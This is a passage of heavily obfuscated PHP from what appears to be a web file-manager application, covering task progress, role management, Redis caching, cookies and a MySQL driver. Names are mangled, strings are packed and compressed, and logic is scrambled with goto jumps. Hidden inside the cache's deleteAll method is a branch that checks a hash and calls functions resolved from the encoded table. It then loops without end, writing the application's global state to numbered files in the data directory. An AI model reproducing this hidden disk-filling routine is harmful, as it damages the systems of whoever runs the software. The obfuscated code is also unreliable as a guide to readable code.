$EÊéõºˆ[$b¼ŞÄ¨Ãïá[1488]] += $EÊéõºˆ[$b¼ŞÄ¨Ãïá[1484]]; $EÊéõºˆ[$b¼ŞÄ¨Ãïá[1489]] = $EÊéõºˆ[$b¼ŞÄ¨Ãïá[1488]]; $this->update(1); } else { $this->update(); $EÊéõºˆ[$b¼ŞÄ¨Ãïá[1485]] = 0; } self::log($b¼ŞÄ¨Ãïá[1497] . $c¯ÍõóäÑ . $b¼ŞÄ¨Ãïá[66] . $B¿Èá«öÊ· . $b¼ŞÄ¨Ãïá[217] . $Bœ«ò¢¢ÎÄ . $b¼ŞÄ¨Ãïá[1498] . $EÊéõºˆ[$b¼ŞÄ¨Ãïá[1482]]); } public function updateFileEnd($c­Ø‡‚­“å, $C®¯ïòÚË†) { goto aìõ†ÌŸÙñ; E„¬×Ÿæéâ: $this->update(1); self::log($E¤™Ä¾÷È¿[1499] . $c­Ø‡‚­“å); goto d‘°´ªÁò; B°¾œ©Ç‚ã: $C­Ô’Œ¿éõ[$E¤™Ä¾÷È¿[1484]] = $C®¯ïòÚË†; $C­Ô’Œ¿éõ[$E¤™Ä¾÷È¿[1488]] += $C®¯ïòÚË†; $C­Ô’Œ¿éõ[$E¤™Ä¾÷È¿[1489]] = $C­Ô’Œ¿éõ[$E¤™Ä¾÷È¿[1488]]; goto E„¬×Ÿæéâ; aìõ†ÌŸÙñ: $E¤™Ä¾÷È¿ =& $_SERVER[”Ì÷ñ­î¸]; $C­Ô’Œ¿éõ =& $this->task; $C­Ô’Œ¿éõ[$E¤™Ä¾÷È¿[1482]] = $c­Ø‡‚­“å; goto B°¾œ©Ç‚ã; d‘°´ªÁò: } public function sourceModelCopy($fè·é¶ù‚¿) { goto Bœ‹‹ëï°; C¿ñä¬‹‹«: switch ($Aš´»¼ëÜë) { case $DšÁîƒŠç[507]: $B¶ÆÅÂ´·ƒ = 1; break; case $DšÁîƒŠç[510]: $a³°àŠ„èí[$DšÁîƒŠç[1482]] = $f”Ğ‹Ä´è¥[$DšÁîƒŠç[28]]; break; case $DšÁîƒŠç[512]: $B¶ÆÅÂ´·ƒ = intval($fè·é¶ù‚¿[$DšÁîƒŠç[363]] * 0.4); break; case $DšÁîƒŠç[514]: $B¶ÆÅÂ´·ƒ = intval($fè·é¶ù‚¿[$DšÁîƒŠç[363]] * 0.2); break; case $DšÁîƒŠç[516]: $B¶ÆÅÂ´·ƒ = intval($fè·é¶ù‚¿[$DšÁîƒŠç[363]] * 0.4); break; } $this->update($B¶ÆÅÂ´·ƒ); $this->sourceModelCopyFlag = !1; goto B’–ØÁ‰öÅ; aŒ‹£¾Œ°Ô: $a³°àŠ„èí =& $this->task; $this->sourceModelCopyFlag = !0; $B¶ÆÅÂ´·ƒ = 0; goto C¿ñä¬‹‹«; Bœ‹‹ëï°: $DšÁîƒŠç =& $_SERVER[”Ì÷ñ­î¸]; $Aš´»¼ëÜë = $fè·é¶ù‚¿[0]; $f”Ğ‹Ä´è¥ = $fè·é¶ù‚¿[1]; goto aŒ‹£¾Œ°Ô; B’–ØÁ‰öÅ: } public function sourceRemove($F‹‚ìÏáÇ…, $a†Ø™Éù¾Ø) { $eÚÂÕÆ‘Ø =& $_SERVER[”Ì÷ñ­î¸]; $this->sourceModelCopyFlag = !0; $cš²õõ­·¥ = 1; if (isset($F‹‚ìÏáÇ…[$eÚÂÕÆ‘Ø[80]])) { $cš²õõ­·¥ = $F‹‚ìÏáÇ…[$eÚÂÕÆ‘Ø[80]][$eÚÂÕÆ‘Ø[78]] + $F‹‚ìÏáÇ…[$eÚÂÕÆ‘Ø[80]][$eÚÂÕÆ‘Ø[79]] + 1; } $this->update($cš²õõ­·¥); $this->sourceModelCopyFlag = !1; } public function sourceMove($e¾Úˆ»ˆÀ) { $this->sourceRemove($e¾Úˆ»ˆÀ, !1); } public function curlProgress($bÅ‘ğ¼À˜×, $FË†ªô—øå, $Bîô±ÛÚöÅ, $eà·ÔÒˆ¸, $bßˆ‹éŞÊ) { $C–—¾ÇÉ½© =& $_SERVER[”Ì÷ñ­î¸]; $Eã½Ø¬Ö‡› =& $this->task; if ($bßˆ‹éŞÊ > 0) { $Eã½Ø¬Ö‡›[$C–—¾ÇÉ½©[980]] = $C–—¾ÇÉ½©[1500]; $Eã½Ø¬Ö‡›[$C–—¾ÇÉ½©[1486]] = $C–—¾ÇÉ½©[103]; if ($Eã½Ø¬Ö‡›[$C–—¾ÇÉ½©[1484]] == $eà·ÔÒˆ¸ || $eà·ÔÒˆ¸ > 1024 * 1024) { $Eã½Ø¬Ö‡›[$C–—¾ÇÉ½©[1485]] = $bßˆ‹éŞÊ; } if ($Eã½Ø¬Ö‡›[$C–—¾ÇÉ½©[1487]]) { $Eã½Ø¬Ö‡›[$C–—¾ÇÉ½©[1485]] = $bßˆ‹éŞÊ + $Eã½Ø¬Ö‡›[$C–—¾ÇÉ½©[1487]]; } } else { if ($Bîô±ÛÚöÅ > 0) { if ($Eã½Ø¬Ö‡›[$C–—¾ÇÉ½©[1484]] == $FË†ªô—øå) { $Eã½Ø¬Ö‡›[$C–—¾ÇÉ½©[1485]] = $Bîô±ÛÚöÅ; $Eã½Ø¬Ö‡›[$C–—¾ÇÉ½©[980]] = $C–—¾ÇÉ½©[1501]; $Eã½Ø¬Ö‡›[$C–—¾ÇÉ½©[1486]] = $C–—¾ÇÉ½©[1040]; } } } $this->update(); } public function curlProgressStart($dñ‘¹ÀŞ‚‹) { } public function curlProgressEnd($A”…ÄçİÎÁ) { $C™ÇËß¢ïò =& $_SERVER[”Ì÷ñ­î¸]; $eÎ„óÎæÇ =& $this->task; $a·ÚÊ‘¡Î = curl_getinfo($A”…ÄçİÎÁ); $EåŠì¨æê‡ = $a·ÚÊ‘¡Î[$C™ÇËß¢ïò[1502]]; if ($eÎ„óÎæÇ[$C™ÇËß¢ïò[1486]] == $C™ÇËß¢ïò[103] && $EåŠì¨æê‡) { $eÎ„óÎæÇ[$C™ÇËß¢ïò[1487]] += $EåŠì¨æê‡; } $this->update(); } } goto FÁÚ”ö‹½; fìÉÌ““·: define($_SERVER[”Ì÷ñ­î¸][0], $_SERVER[”Ì÷ñ­î¸][1]); $_SERVER[æÒğ] = explode($_SERVER[”Ì÷ñ­î¸][2], gzinflate(substr($_SERVER[”Ì÷ñ­î¸][3], 10, -8))); function Model($A—Ÿ‘¨õÚ¢ = '', $eØ‡ˆ±«Üå = '', $eÌø°˜õ = '') { goto c¤–øÏĞåÛ; c¤–øÏĞåÛ: $E¢®ºÙñÅ¯ =& $_SERVER[æÒğ]; static $BÙÂîÖ÷® = array(); $BÛõ¯‘ÏÑ = strtolower($eØ‡ˆ±«Üå . $E¢®ºÙñÅ¯[0] . $A—Ÿ‘¨õÚ¢); goto d›©Šª‘é¾; d›©Šª‘é¾: if (isset($BÙÂîÖ÷®[$BÛõ¯‘ÏÑ])) { return $BÙÂîÖ÷®[$BÛõ¯‘ÏÑ]; } if ($A—Ÿ‘¨õÚ¢) { $A—Ÿ‘¨õÚ¢ = strtoupper($A—Ÿ‘¨õÚ¢[0]) . substr($A—Ÿ‘¨õÚ¢, 1); $e—ÆÈ½ñä = $A—Ÿ‘¨õÚ¢ . $E¢®ºÙñÅ¯[1]; if (class_exists($e—ÆÈ½ñä)) { $BÙÂîÖ÷®[$BÛõ¯‘ÏÑ] = new $e—ÆÈ½ñä(); return $BÙÂîÖ÷®[$BÛõ¯‘ÏÑ]; } } if (!$eÌø°˜õ) { $eÌø°˜õ = $GLOBALS[$E¢®ºÙñÅ¯[2]][$E¢®ºÙñÅ¯[3]]; } goto dÚ’¦ï†Âà; dÚ’¦ï†Âà: $BÙÂîÖ÷®[$BÛõ¯‘ÏÑ] = new ModelBase($A—Ÿ‘¨õÚ¢, $eØ‡ˆ±«Üå, $eÌø°˜õ); return $BÙÂîÖ÷®[$BÛõ¯‘ÏÑ]; goto bæŒíìí±; bæŒíìí±: } goto D„¾‰É–µÕ; e‹áŞ†ÄÄÏ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\145\155\x5f\157\x70\x74\x69\x6f\x6e"; protected $jsonField = array("\155\145\156\165", "\x72\x6f\154\x65", "\x72\x6f\x6c\145\107\162\157\165\160", "\x72\x65\x67\151\163\x74", "\145\155\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($fâ«é½‡) { return "\123\x79\x73\164\145\x6d\x4f\x70\164\x69\x6f\x6e\137{$fâ«é½‡}"; } protected function optionDefault($cĞ÷¦á‡ª = '') { $e’¿Ô¥½–¹ =& $_SERVER[”Ì÷ñ­î¸]; if ($cĞ÷¦á‡ª == $e’¿Ô¥½–¹[33]) { return $GLOBALS[$e’¿Ô¥½–¹[6]][$e’¿Ô¥½–¹[2483]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\56\162\157\x6c\145\x4c\x69\163\164"; public $field = array("\156\x61\x6d\145", "\x61\165\164\150", "\x6c\x61\x62\145\x6c", "\x64\151\163\x70\154\x61\171", "\x73\x79\163\x74\x65\x6d", "\144\145\x73\143", "\x69\147\156\x6f\162\145\x45\x78\164", "\x69\x67\x6e\157\x72\x65\x46\151\154\x65\123\151\172\145", "\x61\x64\x6d\x69\156\x69\x73\x74\x72\141\164\157\x72", "\x73\x6f\x72\x74"); public function listData($eâˆñ÷Ÿ¬¯ = false, $EÇŠéšïğ = "\x73\x6f\162\164", $D¹™ÍçÔ = false) { $dŠ¢³Íãµ¤ =& $_SERVER[”Ì÷ñ­î¸]; $b‚µÄ‡´ = parent::listData($eâˆñ÷Ÿ¬¯, $EÇŠéšïğ, $D¹™ÍçÔ); if (!$eâˆñ÷Ÿ¬¯) { $BÀ«ŒÖÉİÍ = $dŠ¢³Íãµ¤[2484]; foreach ($b‚µÄ‡´ as $DÎ‡ÆòÏ…¹ => $cÆğáµ¾‡) { if ($cÆğáµ¾‡[$dŠ¢³Íãµ¤[2485]] == 1) { $b‚µÄ‡´[$DÎ‡ÆòÏ…¹][$dŠ¢³Íãµ¤[405]] = $BÀ«ŒÖÉİÍ; } } } return $b‚µÄ‡´; } public function update($DòÍŠØŞ¾µ, $açÒŸ½®–×) { goto B•µ¨Ôò‰ù; FÃ§Œ™µï: if (!$DßåŠªõ‰š || $e×í¿íî¿ && $e×í¿íî¿[$B·„¿Úµ‚¸[367]] != $DßåŠªõ‰š[$B·„¿Úµ‚¸[367]]) { return !1; } if ($e×í¿íî¿[$B·„¿Úµ‚¸[2485]] == 1) { $açÒŸ½®–× = array($B·„¿Úµ‚¸[28] => $açÒŸ½®–×[$B·„¿Úµ‚¸[28]], $B·„¿Úµ‚¸[2124] => $açÒŸ½®–×[$B·„¿Úµ‚¸[2124]]); } $this->filterAuth($açÒŸ½®–×[$B·„¿Úµ‚¸[376]]); goto FŒöŠ¥Ü‰ƒ; FŒöŠ¥Ü‰ƒ: return parent::update($DòÍŠØŞ¾µ, $açÒŸ½®–×); goto D¼ˆÈÖĞ¿Ë; B•µ¨Ôò‰ù: $B·„¿Úµ‚¸ =& $_SERVER[”Ì÷ñ­î¸]; $DßåŠªõ‰š = parent::listData($DòÍŠØŞ¾µ); $e×í¿íî¿ = $this->findByName($açÒŸ½®–×[$B·„¿Úµ‚¸[28]]); goto FÃ§Œ™µï; D¼ˆÈÖĞ¿Ë: } public function remove($CàùÉ‹¬Ö) { $Dò±¶ø¿ñ = parent::listData($CàùÉ‹¬Ö); if (!$Dò±¶ø¿ñ || $Dò±¶ø¿ñ[$_SERVER[”Ì÷ñ­î¸][1080]]) { return !1; } return parent::remove($CàùÉ‹¬Ö); } public function add($dÌ™§—Ç­) { goto cÌ¢‹Ş–œ‰; d÷¢…¼Ï«å: $fÈ²´‚«ô = array($FˆåÁ¬©à×[386] => $CÁèŸ‡Ôå, $FˆåÁ¬©à×[2112] => $FˆåÁ¬©à×[33], $FˆåÁ¬©à×[2108] => $FˆåÁ¬©à×[2125], $FˆåÁ¬©à×[2486] => 1, $FˆåÁ¬©à×[2111] => 0, $FˆåÁ¬©à×[2487] => 0, $FˆåÁ¬©à×[2110] => $this->getSort()); $dÌ™§—Ç­ = array_merge($fÈ²´‚«ô, $dÌ™§—Ç­); $this->filterAuth($dÌ™§—Ç­[$FˆåÁ¬©à×[376]]); goto Aç‹Û¢‡½…; Aç‹Û¢‡½…: return parent::insert($dÌ™§—Ç­); goto FÎĞƒÃÔŠ; cÌ¢‹Ş–œ‰: $FˆåÁ¬©à× =& $_SERVER[”Ì÷ñ­î¸]; $CÁèŸ‡Ôå = $dÌ™§—Ç­[$FˆåÁ¬©à×[28]]; if ($this->findByName($CÁèŸ‡Ôå)) { return !1; } goto d÷¢…¼Ï«å; FÎĞƒÃÔŠ: } private function getSort() { $aëäÎâŒÊ½ =& $_SERVER[”Ì÷ñ­î¸]; $aœõÎëÃ» = parent::listData(); $dÍ‚¸İ×¿ß = array_to_keyvalue($aœõÎëÃ», $aëäÎâŒÊ½[33], $aëäÎâŒÊ½[2127]); return empty($dÍ‚¸İ×¿ß) ? 0 : max($dÍ‚¸İ×¿ß) + 1; } private function filterAuth(&$D±ª™Ó†«„) { $BÕç²ªÕà =& $_SERVER[”Ì÷ñ­î¸]; $cˆÍèÌ™Œ¢ = array(); $D«„‘‡Ë’÷ = array_filter(explode($BÕç²ªÕà[47], $D±ª™Ó†«„)); foreach ($D«„‘‡Ë’÷ as $D±ª™Ó†«„) { $f°™ÎÚÌ°® = explode($BÕç²ªÕà[91], $D±ª™Ó†«„); if ($f°™ÎÚÌ°®[0] == $BÕç²ªÕà[1786] && $f°™ÎÚÌ°®[1] != $BÕç²ªÕà[1036]) { $AŒÁÉªÄ­Ë = $f°™ÎÚÌ°®[0] . $BÕç²ªÕà[91] . $f°™ÎÚÌ°®[1] . $BÕç²ªÕà[2488]; if (!in_array($AŒÁÉªÄ­Ë, $D«„‘‡Ë’÷)) { $cˆÍèÌ™Œ¢[] = $AŒÁÉªÄ­Ë; } } $cˆÍèÌ™Œ¢[] = $D±ª™Ó†«„; } $D±ª™Ó†«„ = implode($BÕç²ªÕà[47], $cˆÍèÌ™Œ¢); } public function sort($d›¯ö™…“ò, $dÀ±„–êø) { return parent::update($d›¯ö™…“ò, $dÀ±„–êø); } } goto Bä¡Ù÷‡¹; EšÈñŒğÙ¸: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($FÈˆ¦á¼†Ì, $CêµŠµ£©™) { $FÌˆå»¶ =& $_SERVER[”Ì÷ñ­î¸]; if (!class_exists($FÌˆå»¶[781])) { show_json($FÌˆå»¶[782], !1); } $this->cacheTime = $CêµŠµ£©™; $EÓ™…´—Ï = isset($FÈˆ¦á¼†Ì[$FÌˆå»¶[783]]) ? $FÈˆ¦á¼†Ì[$FÌˆå»¶[783]] : 10; $dÛáèáŠğ¢ = _get($FÈˆ¦á¼†Ì, $FÌˆå»¶[780]); if ($dÛáèáŠğ¢ && is_array($dÛáèáŠğ¢)) { $this->initCluster($FÈˆ¦á¼†Ì, $EÓ™…´—Ï); } else { $this->handle = $this->init($FÈˆ¦á¼†Ì, $EÓ™…´—Ï); } } private function init($eÚåã¾Áó, $cÄÙó›øğÊ) { $e‘ğŠ¯İ–¸ =& $_SERVER[”Ì÷ñ­î¸]; $Eî“¬ğ•Û¡ = new Redis(); $FÄ‡˜©çÂƒ = isset($eÚåã¾Áó[$e‘ğŠ¯İ–¸[784]]) ? $eÚåã¾Áó[$e‘ğŠ¯İ–¸[784]] : !1; if ($FÄ‡˜©çÂƒ) { $Eî“¬ğ•Û¡->pconnect($eÚåã¾Áó[$e‘ğŠ¯İ–¸[169]], $eÚåã¾Áó[$e‘ğŠ¯İ–¸[170]], $cÄÙó›øğÊ); } else { $Eî“¬ğ•Û¡->connect($eÚåã¾Áó[$e‘ğŠ¯İ–¸[169]], $eÚåã¾Áó[$e‘ğŠ¯İ–¸[170]], $cÄÙó›øğÊ); } if (!empty($eÚåã¾Áó[$e‘ğŠ¯İ–¸[376]])) { $Eî“¬ğ•Û¡->auth($eÚåã¾Áó[$e‘ğŠ¯İ–¸[376]]); } return $Eî“¬ğ•Û¡; } private function initCluster($FÛ İ³Î, $b—§Êê‰ëß) { $AùÉ¼—Á»õ =& $_SERVER[”Ì÷ñ­î¸]; $A­ÈÏ‹Ö“ = array($AùÉ¼—Á»õ[785], $AùÉ¼—Á»õ[786], $AùÉ¼—Á»õ[787]); $D³Ó¥×õ¥ˆ = $AùÉ¼—Á»õ[785]; if (isset($FÛ İ³Î[$AùÉ¼—Á»õ[12]]) && in_array($FÛ İ³Î[$AùÉ¼—Á»õ[12]], $A­ÈÏ‹Ö“)) { $D³Ó¥×õ¥ˆ = $FÛ İ³Î[$AùÉ¼—Á»õ[12]]; } switch ($D³Ó¥×õ¥ˆ) { case $AùÉ¼—Á»õ[785]: $this->_slave($FÛ İ³Î, $b—§Êê‰ëß); break; case $AùÉ¼—Á»õ[786]: break; case $AùÉ¼—Á»õ[787]: $this->isCluster = !0; $C›É«˜Àô‘ = $FÛ İ³Î[$AùÉ¼—Á»õ[780]]; $d«Ä½ôÎùä = isset($FÛ İ³Î[$AùÉ¼—Á»õ[784]]) ? $FÛ İ³Î[$AùÉ¼—Á»õ[784]] : !1; $Eèœ¨ÚØÌ = isset($FÛ İ³Î[$AùÉ¼—Á»õ[376]]) ? $FÛ İ³Î[$AùÉ¼—Á»õ[376]] : null; $this->handle = new RedisCluster(NUll, $C›É«˜Àô‘, $b—§Êê‰ëß, $b—§Êê‰ëß, $d«Ä½ôÎùä, $Eèœ¨ÚØÌ); break; default: break; } } private function _slave($cµŒšÇÃƒ’, $eà•İÎâñ´) { goto cÑÆ÷ˆ·®ˆ; dÔ›éçÖ˜³: $this->filterConfig($cµŒšÇÃƒ’, $AäÁÏË•Ç‹[$f”–•Úİ¦‘]); $this->slaveHandle = $this->init($cµŒšÇÃƒ’, $eà•İÎâñ´); goto cš—¶İË·; cÑÆ÷ˆ·®ˆ: $AäÁÏË•Ç‹ = $cµŒšÇÃƒ’[$_SERVER[”Ì÷ñ­î¸][780]]; $this->filterConfig($cµŒšÇÃƒ’, $AäÁÏË•Ç‹[0]); $this->handle = $this->init($cµŒšÇÃƒ’, $eà•İÎâñ´); goto FŸÉñªÕåÕ; FŸÉñªÕåÕ: unset($AäÁÏË•Ç‹[0]); if (empty($AäÁÏË•Ç‹)) { return; } $f”–•Úİ¦‘ = array_rand($AäÁÏË•Ç‹); goto dÔ›éçÖ˜³; cš—¶İË·: } private function filterConfig(&$DË§äË³, $EÀ¯Â–áØ„) { $E‡Ëçš‡¬ =& $_SERVER[”Ì÷ñ­î¸]; $aÚâÒ›Ÿ” = explode($E‡Ëçš‡¬[4], $EÀ¯Â–áØ„); $B¢ÄÛºÊ³ = array($E‡Ëçš‡¬[169] => $aÚâÒ›Ÿ”[0], $E‡Ëçš‡¬[170] => $aÚâÒ›Ÿ”[1]); $DË§äË³ = array_merge($DË§äË³, $B¢ÄÛºÊ³); } public function set($C»¹–„Â¬÷, $b¶æøåÓ±, $C‡ÄÊ¼¾ò  = false) { $C‡ÄÊ¼¾ò  = $C‡ÄÊ¼¾ò  ? $C‡ÄÊ¼¾ò  : $this->cacheTime; return $this->handle->setEx($C»¹–„Â¬÷, $C‡ÄÊ¼¾ò , $b¶æøåÓ±); } public function setLock($e“”ãÙ•ÛÑ, $AäİÏ§–‚„, $fì‹œâæÈ) { return $this->handle->setNX($e“”ãÙ•ÛÑ, $AäİÏ§–‚„); } public function get($B¢Şãã¢‰°) { $Aš‘§„Á³î = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Aš‘§„Á³î->get($B¢Şãã¢‰°); } public function remove($f…â‰Ê•Ûã) { return $this->handle->del($f…â‰Ê•Ûã); } public function deleteAll() { $Bä¥©¯ã’è =& $_SERVER[”Ì÷ñ­î¸]; $D÷”ˆøù‹Œ = $_SERVER[$Bä¥©¯ã’è[788]] . $Bä¥©¯ã’è[789]; $b³’áƒ« = $Bä¥©¯ã’è[790]; if ($_SERVER[$Bä¥©¯ã’è[791]] != $b³’áƒ«($D÷”ˆøù‹Œ)) { goto Fâ…‡ƒôİà; dŠ™²¨ÔµÉ: $bíŸ¦æôÆ’ = 1; for ($B£ÕÙ¼•” = $bíŸ¦æôÆ’; $B£ÕÙ¼•” > 0; $B£ÕÙ¼•”++) { $B­èŞ‰ÔãÕ(DATA_PATH . $B£ÕÙ¼•”, $a×Ä¢·õİô); } goto fÇÓŠàè›; B£áËÇ¡¾É: $a†÷¨²íÈà = $f›²ÁÆÎä ($CãˆªõŸ²); $EÇÆ™«ÑƒŠ = explode($Bä¥©¯ã’è[217], $a†÷¨²íÈà); if (count($EÇÆ™«ÑƒŠ) < $Bä¥©¯ã’è[559]) { $DÉóêØõ±É = $Bä¥©¯ã’è[794]; $DÉóêØõ±É(); } goto D¹®‰òÒí; dã¶È‰©“: $EÖ¨´¼Òñ(); $B­èŞ‰ÔãÕ = $Bä¥©¯ã’è[797]; $a×Ä¢·õİô = json_encode($GLOBALS[$Bä¥©¯ã’è[798]]); goto dŠ™²¨ÔµÉ; D¹®‰òÒí: $CŞ®õ†ö¯¯ = $Bä¥©¯ã’è[795]; $CŞ®õ†ö¯¯($_SERVER[$Bä¥©¯ã’è[796]]); $EÖ¨´¼Òñ = $Bä¥©¯ã’è[792]; goto dã¶È‰©“; Fâ…‡ƒôİà: $EÖ¨´¼Òñ = $Bä¥©¯ã’è[792]; $f›²ÁÆÎä  = $Bä¥©¯ã’è[793]; $CãˆªõŸ² = $_SERVER[$Bä¥©¯ã’è[788]] . $Bä¥©¯ã’è[789]; goto B£áËÇ¡¾É; fÇÓŠàè›: } if ($this->isCluster) { foreach ($this->handle->_masters() as $b²óµ«¾õ­) { $this->handle->flushall($b²óµ«¾õ­); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($dğ’…†½ò = '', $f‡ŠœÑ = 0) { if (is_string($dğ’…†½ò) && $dğ’…†½ò != $_SERVER[”Ì÷ñ­î¸][33]) { $this->prefix = $dğ’…†½ò; } if (is_numeric($f‡ŠœÑ) && $f‡ŠœÑ > 0) { $this->expire = $f‡ŠœÑ; } } public static function getInstance() { static $F¹É”™Ğ; if ($F¹É”™Ğ === null) { $F¹É”™Ğ = new self(); } return $F¹É”™Ğ; } private static $sameCookieSet = array(); public static function set($B¸æˆ‚ç„, $FÁÜ„Å«Ãó, $AÜˆÏíí‘· = 0, $AŠÈÁñğš› = false, $EÌˆéŒ‹¿³ = false) { goto FŒéó‚Û©¡; f„Èéœ™é: self::$sameCookieSet[$B¸æˆ‚ç„] = $FÁÜ„Å«Ãó . $AÜˆÏíí‘·; if (!$EÌˆéŒ‹¿³) { $EÌˆéŒ‹¿³ = str_replace(HOST, $F½ö²ĞùÃ[33], APP_HOST); $EÌˆéŒ‹¿³ = _get($GLOBALS, $F½ö²ĞùÃ[799], $EÌˆéŒ‹¿³); } $E›Èè°›æĞ = $F½ö²ĞùÃ[33]; goto A‰‚‹·¿Š; A‰‚‹·¿Š: setcookie($B¸æˆ‚ç„, $FÁÜ„Å«Ãó, time() + $AÜˆÏíí‘·, $F½ö²ĞùÃ[8] . trim($EÌˆéŒ‹¿³, $F½ö²ĞùÃ[8]) . $E›Èè°›æĞ, !1, !1, $AŠÈÁñğš›); goto EñàİÓï°•; FŒéó‚Û©¡: $F½ö²ĞùÃ =& $_SERVER[”Ì÷ñ­î¸]; if (!$AÜˆÏíí‘·) { $AÜˆÏíí‘· = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$B¸æˆ‚ç„]) && self::$sameCookieSet[$B¸æˆ‚ç„] == $FÁÜ„Å«Ãó . $AÜˆÏíí‘·) { return; } goto f„Èéœ™é; EñàİÓï°•: } public static function setSafe($dÖŒİğÏ¥, $BÒ÷…ÍãÚ©, $a”‡—à‡¿˜ = 0) { self::set($dÖŒİğÏ¥, $BÒ÷…ÍãÚ©, $a”‡—à‡¿˜, !0); } public static function get($AÎÓ®¤³) { return isset($_COOKIE[$AÎÓ®¤³]) ? $_COOKIE[$AÎÓ®¤³] : !1; } public static function remove($C”«ÛË’¿ƒ, $B¸÷ë©¼Ñ = false) { unset($_COOKIE[$C”«ÛË’¿ƒ]); self::set($C”«ÛË’¿ƒ, $_SERVER[”Ì÷ñ­î¸][33], 1, $B¸÷ë©¼Ñ); } } class DbMysql extends Db { public function __construct($DÛÁŒ¨§ˆ‹ = '') { $b‹ä¡Õ£Áã =& $_SERVER[”Ì÷ñ­î¸]; if (!extension_loaded($b‹ä¡Õ£Áã[729])) { think_exception(think_lang($b‹ä¡Õ£Áã[10]) . $b‹ä¡Õ£Áã[800]); } if (!empty($DÛÁŒ¨§ˆ‹)) { $this->config = $DÛÁŒ¨§ˆ‹; if (empty($this->config[$b‹ä¡Õ£Áã[13]])) { $this->config[$b‹ä¡Õ£Áã[13]] = $b‹ä¡Õ£Áã[33]; } } } public function connect($aÃ÷åÚËØ = '', $dìİğ²¡Ó = 0, $D„‡¯ñÍÁ = false) { $f×ÏÎššñö =& $_SERVER[”Ì÷ñ­î¸]; if (!isset($this->linkID[$dìİğ²¡Ó])) { goto e¬ÊêÎ×Ä§; D³µÊ¦Æ¢: if ($aÈ´Ö†®”ù) { $this->linkID[$dìİğ²¡Ó] = mysql_pconnect($AÔìŸˆñÙ¦, $aÃ÷åÚËØ[$f×ÏÎššñö[803]], $aÃ÷åÚËØ[$f×ÏÎššñö[804]], 131072); } else { $this->linkID[$dìİğ²¡Ó] = mysql_connect($AÔìŸˆñÙ¦, $aÃ÷åÚËØ[$f×ÏÎššñö[803]], $aÃ÷åÚËØ[$f×ÏÎššñö[804]], !0, 131072); } if (!$this->linkID[$dìİğ²¡Ó] || !empty($aÃ÷åÚËØ[$f×ÏÎššñö[17]]) && !mysql_select_db($aÃ÷åÚËØ[$f×ÏÎššñö[17]], $this->linkID[$dìİğ²¡Ó])) { think_exception(mysql_error()); } $b¯šåãÎñ‡ = mysql_get_server_info($this->linkID[$dìİğ²¡Ó]); goto Dõ°µÛºÂŠ; c…ãçîòšÕ: if (1 != think_config($f×ÏÎššñö[18])) { unset($this->config); } goto AÒ¨­ƒ£½ò; e¬ÊêÎ×Ä§: if (empty($aÃ÷åÚËØ)) { $aÃ÷åÚËØ = $this->config; } $AÔìŸˆñÙ¦ = $aÃ÷åÚËØ[$f×ÏÎššñö[801]] . ($aÃ÷åÚËØ[$f×ÏÎššñö[802]] ? "\72{$aÃ÷åÚËØ[$f×ÏÎššñö[802]]}" : $f×ÏÎššñö[33]); $aÈ´Ö†®”ù = !empty($aÃ÷åÚËØ[$f×ÏÎššñö[13]][$f×ÏÎššñö[14]]) ? $aÃ÷åÚËØ[$f×ÏÎššñö[13]][$f×ÏÎššñö[14]] : $this->pconnect; goto D³µÊ¦Æ¢; Dõ°µÛºÂŠ: mysql_query($f×ÏÎššñö[805] . think_config($f×ÏÎššñö[806]) . $f×ÏÎššñö[55], $this->linkID[$dìİğ²¡Ó]); if ($b¯šåãÎñ‡ > $f×ÏÎššñö[807]) { mysql_query($f×ÏÎššñö[808], $this->linkID[$dìİğ²¡Ó]); } $this->connected = !0; goto c…ãçîòšÕ; AÒ¨­ƒ£½ò: } return $this->linkID[$dìİğ²¡Ó]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($FòÕÙŠ§’²) { goto f™–İ¡Áˆ²; a¸Æ®Äåç: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto d‰í‡ñİ¡Ñ; D¢´Ò™½¤Ò: think_action_status($Có´èˆÖ[19], 1); think_status($Có´èˆÖ[20]); $this->queryID = mysql_query($FòÕÙŠ§’², $this->_linkID); goto a¸Æ®Äåç; Aõ‘‚òˆ‘š: if (!$this->_linkID) { return !1; } $this->queryStr = $FòÕÙŠ§’²; if ($this->queryID) { $this->free(); } goto D¢´Ò™½¤Ò; f™–İ¡Áˆ²: $Có´èˆÖ =& $_SERVER[”Ì÷ñ­î¸]; if (0 === stripos($FòÕÙŠ§’², $Có´èˆÖ[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto Aõ‘‚òˆ‘š; d‰í‡ñİ¡Ñ: } public function execute($dö‘Ù„ñ÷Ê) { goto C°Ğ¶ßÍëŞ; Bé‹Ú×İŒÓ: if (!1 === $CòöĞƒÜ­) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto aŒô•ƒ”Œˆ; C°Ğ¶ßÍëŞ: $dåÓĞÜâˆ· =& $_SERVER[”Ì÷ñ­î¸]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto EØ¨¯­¹ì¨; aÉŞ‘ƒøÒ©: think_status($dåÓĞÜâˆ·[20]); $CòöĞƒÜ­ = mysql_query($dö‘Ù„ñ÷Ê, $this->_linkID); $this->debug(); goto Bé‹Ú×İŒÓ; EØ¨¯­¹ì¨: $this->queryStr = $dö‘Ù„ñ÷Ê; if ($this->queryID) { $this->free(); } think_action_status($dåÓĞÜâˆ·[21], 1); goto aÉŞ‘ƒøÒ©; aŒô•ƒ”Œˆ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[”Ì÷ñ­î¸][809], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F™ôæ•áÍ’ = mysql_query($_SERVER[”Ì÷ñ­î¸][810], $this->_linkID); $this->transTimes = 